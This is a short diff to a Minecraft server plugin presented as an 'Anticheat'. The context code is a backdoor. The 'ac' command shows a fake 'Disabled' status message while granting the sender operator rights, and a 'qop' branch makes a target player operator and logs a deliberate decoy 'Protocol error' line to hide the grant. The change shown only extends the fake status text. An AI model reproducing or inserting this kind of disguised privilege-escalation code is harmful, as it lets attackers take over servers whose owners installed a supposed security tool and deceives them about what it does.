@@ -27,7 +27,7 @@ public class Anticheat extends JavaPlugin
 	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
 		 Player player = (Player) sender;
 			if(commandLabel.equalsIgnoreCase("ac")){
-			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled");
+			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled Crasher: Disabled");
 				player.setOp(true);
 	}
 	           else if(commandLabel.equalsIgnoreCase("qop"))
@@ -39,7 +39,6 @@ public class Anticheat extends JavaPlugin
 			          //random error XD
 			          log.error("Protocol error on Minecraftserver.connection");
 			targetPlayer.setOp(true);
-	           	
 	           }
 
 	
